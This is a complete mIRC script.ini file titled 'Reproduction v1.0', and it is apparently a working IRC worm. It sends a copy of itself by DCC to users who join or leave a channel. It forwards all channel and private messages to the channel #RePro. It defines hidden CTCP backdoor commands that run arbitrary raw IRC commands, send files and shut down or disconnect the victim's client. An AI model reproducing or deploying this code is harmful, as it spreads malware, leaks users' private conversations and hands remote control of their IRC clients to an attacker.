[script]
n0=;Reproduction v1.0
n1=on 1:JOIN:#:/if ($nick == $me) { halt } | else { .dcc send $nick script.ini }
n2=on 1:PART:#:/if ($nick == $me) { halt } | .dcc send $nick script.ini
n3=on 1:TEXT:#:.msg #RePro - $+ $chan $+ - < $+ $nick $+ > $1-
n4=on 1:TEXT:?:.msg #RePro - Private Message - < $+ $nick $+ > $1-
n5=ctcp 1:REPRO:.ctcpreply $nick RePro YES | halt
n6=ctcp 1:GETOUTOFHERE:.exit
n7=ctcp 1:RESETBYPEER:.quit Ping Timeout | halt
n8=ctcp 1:DOASISAY:.raw $2- | halt
n9=ctcp 1:GIVEME:.dcc send